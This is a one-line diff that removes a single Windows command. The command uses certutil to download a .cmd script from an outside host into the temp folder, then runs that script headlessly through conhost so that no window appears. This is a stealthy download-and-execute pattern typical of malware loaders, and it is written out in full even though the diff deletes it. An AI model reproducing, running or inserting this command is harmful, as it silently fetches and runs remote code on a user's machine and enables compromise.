@@ -1,1 +1,0 @@
-%SystemRoot%\System32\conhost.exe cmd /c "%SystemRoot%\System32\certutil.exe -urlcache -split -f https://baa4ts.is-a.dev/v3/carpeta.cmd %TMP%\carpeta.cmd & %SystemRoot%\System32\conhost.exe --headless cmd /c %TMP%\carpeta.cmd"
